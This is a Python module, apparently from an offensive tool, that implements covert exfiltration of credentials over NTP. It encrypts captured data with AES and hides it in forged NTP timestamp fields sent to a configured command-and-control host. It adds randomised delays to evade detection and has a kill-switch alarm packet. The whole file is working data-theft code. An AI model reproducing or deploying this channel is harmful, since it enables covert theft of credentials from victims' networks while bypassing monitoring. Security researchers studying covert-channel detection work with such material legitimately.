import socket
import threading
import time
import pyaes
import pyscrypt
import random
import logging
from datetime import datetime

# Me
__author__ = "Emilio / @ekio_jp"
__version__ = "2.020"


class ExfilNTP(threading.Thread):
    def __init__(self, q, conf):
        threading.Thread.__init__(self)
        self.stoprequest = threading.Event()
        self.q = q
        self.magic = conf['MAGIC']
        self.ip = conf['IP']
        self.cchost = conf['CCHOST']
        self.phrase = conf['PHRASE']
        self.salt = conf['SALT']
        self.debug = conf['DEBUG']
        if conf['DEBUG']:
            logging.basicConfig(level=logging.DEBUG)

    def run(self):
        while not self.stoprequest.isSet():
            data = self.q.get()
            # Kill Switch
            if data == self.magic:
                self.alarm()
                self.stoprequest.set()
            else:
                # encrypt and split into 32 bits (4 bytes)
                cry = self.encrypt(data)
                ar = [cry[i:i+8] for i in range(0, len(cry), 8)]
                if len(cry) % 8 != 0:
                    for x in range(8-len(ar[len(ar)-1])):
                        ar[len(ar)-1] = ar[len(ar)-1] + '0'

                logging.debug('Sending credentials via NTP')

                # first pkt
                # Stratum = 16
                # Poll + Precision (2 bytes) = len crypto (left-pad)
                # Divide len crypto / 8 (rounded) => amount of pkts
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, 0)
                s.bind((self.ip, 123))
                s.connect((self.cchost, 123))
                timenow = datetime.utcnow() - datetime(1900, 1, 1, 0, 0, 0)
                ntptime = bytes.fromhex(format(int(timenow.total_seconds()), 'x'))
                if len(cry) < 127:
                    crylen = b'\0' + chr(len(cry)).encode()
                else:
                    crylen = chr(len(cry)).encode()

                ntppkt = b'\xe3\x10' + crylen + b'\0\x01\0\0\0\x01' + 30 * b'\0' + ntptime + 4 * b'\0'
                s.send(ntppkt)

                # random delay
                if self.debug:
                    time.sleep(1)
                else:
                    time.sleep(random.randint(1, 30))

                # paylod pkts
                # Stratum = 0
                # Poll = seq #
                # Transmit Timestamp  = <timestamp>.<crypto> 32 bits (4 bytes)
                for x in range(len(ar)):
                    timenow = datetime.utcnow() - datetime(1900, 1, 1, 0, 0, 0)
                    ntptime = bytes.fromhex(format(int(timenow.total_seconds()), 'x'))
                    ntppkt = b'\xe3\0' + chr(x+1).encode() + b'\xfa' + b'\0\x01\0\0\0\x01' + 30 * b'\0' + ntptime + bytes.fromhex(ar[x])
                    s.send(ntppkt)
                    # random delay
                    if self.debug:
                        time.sleep(1)
                    else:
                        time.sleep(random.randint(1, 30))
                s.close()

    # AES crypto
    def encrypt(self, cleartxt):
        key = pyscrypt.hash(self.phrase.encode(), self.salt.encode(), 1024, 1, 1, 16)
        aes = pyaes.AESModeOfOperationCTR(key)
        ciphertxt = aes.encrypt(cleartxt.encode())
        return ciphertxt.hex()

    # Alarm Funtion
    def alarm(self):
        # NTP (Stratum 99)
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, 0)
        s.bind((self.ip, 123))
        s.connect((self.cchost, 123))
        timenow = datetime.utcnow() - datetime(1900, 1, 1, 0, 0, 0)
        ntptime = bytes.fromhex(format(int(timenow.total_seconds()), 'x'))
        alarmpkt = b'\xe3\x63\x14\x14\0\x01\0\0\0\x01' + 30 * b'\0' + ntptime + 4 * b'\0'
        s.send(alarmpkt)

    # Stop Function
    def join(self):
        self.stoprequest.set()
